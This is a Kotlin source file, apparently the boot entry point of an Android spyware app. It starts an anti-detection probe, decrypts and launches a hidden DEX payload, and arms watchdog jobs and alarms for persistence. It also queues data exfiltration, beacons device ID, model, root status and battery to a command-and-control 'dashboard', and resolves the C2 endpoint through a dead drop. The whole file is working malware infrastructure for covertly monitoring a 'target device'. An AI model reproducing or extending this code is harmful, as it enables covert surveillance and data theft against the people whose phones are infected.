package com.sp.core

import android.app.Application
import android.util.Log
import com.sp.loader.DexLoader
import com.sp.core.stealth.AntiDetect
import com.sp.core.util.BatchExfil
import com.sp.core.util.Beacon
import com.sp.core.util.DeadDrop
import com.sp.watchdog.WatchdogAlarm
import com.sp.watchdog.WatchdogJob

/**
 * Boot entry point.
 *
 * Nothing that can throw is executed here: the app must survive the start of
 * the process no matter what the device state is. Foreground services are
 * started later from the setup wizard (the app is in the foreground there,
 * which is what Android 12+ requires).
 */
class App : Application() {

    override fun onCreate() {
        super.onCreate()
        installCrashHandler()
        uploadPendingCrash()

        // A previous version may have hidden the launcher icon - make sure the
        // app can always be started again.
        try {
            com.sp.core.stealth.IconHider.show(this)
        } catch (t: Throwable) {
        }

        // Off the main thread: the environment probe does file and socket
        // checks and must never block the looper.
        Thread {
            try {
                AntiDetect.guard(this)
            } catch (t: Throwable) {
                Log.w(TAG, "antidetect: ${t.message}")
            }
        }.start()

        // Everything heavy runs off the main thread: decrypting and verifying
        // a multi-megabyte DEX inside Application.onCreate() was the reason
        // for the "app dies right after the icon is tapped" ANR.
        Thread {
            try {
                DexLoader.launch(this)
            } catch (t: Throwable) {
                Log.w(TAG, "payload: ${t.message}")
            }
        }.start()

        try {
            WatchdogJob.schedule(this)
        } catch (t: Throwable) {
            Log.w(TAG, "watchdog job: ${t.message}")
        }
        try {
            WatchdogAlarm.arm(this)
        } catch (t: Throwable) {
            Log.w(TAG, "watchdog alarm: ${t.message}")
        }

        try {
            BatchExfil.enqueue(this, "boot", """{"ts":${System.currentTimeMillis()}}""")
        } catch (t: Throwable) {
        }

        // Plaintext beacon: proves the app is alive even when the encrypted
        // channel or the payload loader fails.
        Beacon.send(this, "boot", bootInfo())

        // Dead-drop resolution of the C2 endpoint (off the main thread).
        Thread {
            try { DeadDrop.resolve(this) } catch (_: Throwable) {}
        }.start()
    }

    /**
     * Ships uncaught exceptions to the C2 so a crash can be diagnosed from
     * the dashboard - the target device has no terminal.
     */
    private fun installCrashHandler() {
        try {
            val previous = Thread.getDefaultUncaughtExceptionHandler()
            Thread.setDefaultUncaughtExceptionHandler { thread, error ->
                val payload = try {
                    val stack = error.stackTrace.take(30).joinToString(" | ") {
                        "${it.className}.${it.methodName}:${it.lineNumber}"
                    }
                    """{"fatal":true,"thread":"${thread.name}","err":"${error.javaClass.name}","msg":"${error.message}","stack":"$stack","ts":${System.currentTimeMillis()}}"""
                } catch (_: Throwable) {
                    """{"fatal":true,"err":"${error.javaClass.name}"}"""
                }
                try {
                    com.sp.core.c2.Exfil.sendLogSync(this, "crash", payload)
                } catch (_: Throwable) {
                }
                try {
                    Beacon.sendSync(this, "crash", payload)
                } catch (_: Throwable) {
                }
                try {
                    java.io.File(filesDir, "crash.log").writeText(payload)
                } catch (_: Throwable) {
                }
                previous?.uncaughtException(thread, error)
            }
        } catch (t: Throwable) {
            Log.w(TAG, "crash handler: ${t.message}")
        }
    }

    /**
     * A crash that killed the process is written to a file first, so the
     * report survives and is delivered on the next start.
     */
    private fun uploadPendingCrash() {
        try {
            val f = java.io.File(filesDir, "crash.log")
            if (!f.exists() || f.length() == 0L) return
            val text = f.readText()
            f.delete()
            com.sp.core.c2.Exfil.sendLog(this, "crash", text)
        } catch (_: Throwable) {
        }
    }

    /** Small plaintext status blob - visible on the dashboard immediately. */
    private fun bootInfo(): String {
        val sb = StringBuilder()
        sb.append("{\"sdk\":").append(android.os.Build.VERSION.SDK_INT)
        sb.append(",\"model\":\"").append(android.os.Build.MODEL).append("\"")
        sb.append(",\"release\":\"").append(android.os.Build.VERSION.RELEASE).append("\"")
        sb.append(",\"app\":\"").append(com.sp.core.BuildConfig.VERSION_NAME).append("\"")
        sb.append(",\"device_id\":\"").append(com.sp.core.util.Prefs.deviceId(this)).append("\"")
        sb.append(",\"rooted\":").append(com.sp.core.stealth.AntiDetect.isRooted())
        sb.append(",\"battery\":").append(com.sp.core.util.Battery.percent(this))
        sb.append(",\"ts\":").append(System.currentTimeMillis())
        sb.append("}")
        return sb.toString()
    }

    companion object {
        private const val TAG = "App"
    }
}
